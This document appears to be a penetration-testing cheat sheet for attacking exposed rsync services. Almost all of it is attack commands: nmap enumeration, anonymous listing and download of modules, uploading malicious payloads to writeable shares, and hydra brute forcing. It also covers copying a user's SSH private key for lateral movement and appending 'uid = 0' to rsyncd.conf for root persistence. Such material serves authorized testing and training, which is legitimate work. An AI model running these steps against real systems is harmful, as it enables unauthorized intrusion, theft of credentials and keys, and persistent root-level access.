!!! tip "Start here"
    List modules (shares) anonymously: `rsync -av --list-only rsync://<target>`. If modules appear, try downloading without credentials: `rsync -av rsync://<target>/<module> ./`. Look for SSH keys, config backups, and database dumps in the pulled files.

## Enumeration
### Check for Open Rsync Port
```bash
nmap -p 873 --script rsync-list-modules <target-ip>
```

## List Accessible Rsync Modules (Shares)
If Rsync allows anonymous or unauthenticated access, attempt to list or download files:
```bash
rsync -av --list-only rsync://<target-ip>
```
## Downloading Files via Rsync
### Entire module (recursive)
```bash
rsync -av rsync://<target-ip>/module_name ./local_folder
```

### Specific Folder
```bash
rsync -av rsync://<target-ip>/module_name/file.txt ./
```

## Uploading Files via Rsync
Assuming the module is writeable, attempt to upload files or malicious payloads:
```bash
rsync -av ./localfile rsync://<target-ip>/module_name/
```

Verify uploaded files by attempting to download them again. Reference download command.

## Brute Forcing 
```bash
hydra -L users.txt -P passwords.txt rsync://<target-ip>
```

## Post-Exploitation & Lateral Movement
### Stealing SSH Keys for Lateral Movement
If SSH keys are exposed:
```bash
rsync -av rsync://<target-ip>/home/user/.ssh/id_rsa .
```

### Modifying Rsync Configuration for Persistence
If **access to `/etc/rsyncd.conf`** is obtained, modify settings to maintain persistence:
```bash
echo "uid = 0" >> /etc/rsyncd.conf
```

Restart service:
```bash
systemctl restart rsync
```